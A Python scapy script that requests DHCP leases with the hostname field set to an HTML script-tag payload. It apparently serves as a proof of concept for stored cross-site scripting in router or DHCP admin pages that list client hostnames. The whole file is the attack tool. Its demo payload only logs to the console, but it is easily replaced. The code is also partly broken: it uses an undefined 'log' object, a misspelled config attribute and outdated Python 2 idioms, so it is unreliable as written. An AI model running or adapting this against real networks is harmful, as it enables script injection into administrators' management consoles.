#!/usr/bin/env python

import sys, logging, time, signal

logging.addLevelName(logging.DEBUG, "[i]")
logging.addLevelName(logging.INFO,  "[+]")
logging.addLevelName(logging.ERROR, "[!]")

from scapy.all import *
import scapy

logging.getLogger("scapy").setLevel(1)

payload = "<script>console.log(1)</script>"

offers = []
leases = []

def options(dhcp_options, key):
    try:
        return filter(lambda x: x[0] == key, dhcp_options)[0][1]
    except:
        pass

def on_packet(packet):
    if DHCP in packet:
        opts = packet[DHCP].options

        log.info(packet.summary())
        # log.debug(packet[BOOTP].show())
        # log.debug(packet[DHCP].show())
        #log.debug(opts)

        # offer response
        type = options(opts, 'message-type')

        if type == 2:
            log.info("detected dhcp discover response: %s", packet.summary())
            offer = {
                "server_ip":  packet[IP].src,
                "server_mac": packet[Ether].src,
                "ip":         packet[BOOTP].yiaddr
            }

            for o in opts:
                if not isinstance(o, basestring):
                    offer[o[0]] = o[1]
            offers.append(offer)

        # ack request
        if type == 5:
            lease = {
                "server_ip":  packet[IP].src,
                "server_mac": packet[Ether].src,
                "ip":         packet[BOOTP].yiaddr
            }

            for o in opts:
                if not isinstance(o, basestring):
                    lease[o[0]] = o[1]
            leases.append(lease)

            log.info("lease accepted from %s with ip %s", lease["server_ip"], lease["ip"])

if __name__ == '__main__':
    if len(sys.argv) != 2:
        log.error("usage: %s <interface>", sys.argv[0])
        sys.exit(1)

    conf.iface = sys.argv[1]

    conf.chekcIPaddr = False
    mac  = get_if_hwaddr(conf.iface)
    fam, hw   = get_if_raw_hwaddr(conf.iface)

    log.info("using interface: %s [%s]", conf.iface, mac)
    log.info("using hostname payload: %s", payload)


    ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=hw, type=0x800)
    ip       = IP(src ='0.0.0.0', dst='255.255.255.255')
    udp      = UDP (sport=68, dport=67)
    bootp    = BOOTP(op=1, chaddr=hw)
    dhcp     = DHCP(options=[("message-type","discover"),('end')])
    packet   = ethernet / ip / udp / bootp / dhcp

    sendp(packet, iface=conf.iface)

    sniff(prn=on_packet, store=0, count=1, timeout=10, iface=conf.iface, filter="port 68 and port 67")

    if len(offers) == 0:
        log.error("no dhcp offers!")
        sys.exit(1)

    log.info("offers: %s", offers)

    for offer in offers:
        log.info("accepting offer for dhcp server %s", offer["server_id"])

        dhcp = DHCP(options=[("message-type","request"), ("hostname",payload), ("server_id",offer["server_id"]), ("requested_addr",offer["ip"]), ("end")])
        packet = ethernet / ip / udp / bootp / dhcp

        sendp(packet, iface=conf.iface)

        sniff(prn=on_packet, store=0, count=1, timeout=10, iface=conf.iface, filter="port 68 and port 67")

    if len(leases) == 0:
        log.error("no lease requests ack'd")
        sys.exit(1)

    def cleanup(signal, frame):
        print
        log.info("cleaning up")
        for lease in leases:
            log.info("releasing %s from %s ", lease["ip"], lease["server_id"])
            dhcp = DHCP(options=[("message-type","release"), ("server_id", lease["server_id"]), ("requested_addr",lease["ip"]), ("end")])
            packet = ethernet / ip / udp / bootp / dhcp

            sendp(packet, iface=conf.iface)
            # sniff(prn=on_packet, store=0, count=1, timeout=10, iface=conf.iface, filter="port 68 and port 67")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    log.info("press ^C to release dhcp leases")
    while True:
        time.sleep(1)
